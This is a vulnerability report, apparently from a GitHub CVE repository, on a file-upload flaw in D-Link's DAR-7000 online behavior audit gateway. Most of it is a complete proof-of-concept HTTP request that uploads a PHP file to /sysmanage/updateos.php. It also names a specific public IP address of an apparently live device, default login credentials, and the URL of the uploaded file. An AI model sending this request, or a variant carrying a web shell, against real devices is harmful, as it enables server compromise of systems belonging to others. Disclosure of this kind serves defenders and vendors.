The D-LINK DAR-7000 series online behavior audit gateway has a file upload vulnerability. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.

official： http://www.dlink.com.cn/

version:DAR-7000  DAR V31R02B1413C

Vulnerability Path ：/sysmanage/updateos.php

Ip：https://60.22.74.195:8443/

Default account password: test/ admin@123

poc:
```
POST /sysmanage/updateos.php? HTTP/1.1
Host: 60.22.74.195:8443
Cookie: PHPSESSID=16b7d22c9d0e23596f887c0d3f7e7920
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 597
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_file_upload"; filename="1.php"
Content-Type: application/octet-stream

<?php phpinfo()?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="id_type"

1
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="1_ck"

1_radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="mode"

set
-----------------------------42328904123665875270630079328—
```

<img width="725" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/d02c0624-e1bc-4651-91fd-1d887cd724cb">

https://60.22.74.195:8443/home/1.php 

<img width="725" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/b8c2de98-c0d7-46ef-8f80-3e1f3605bb67">

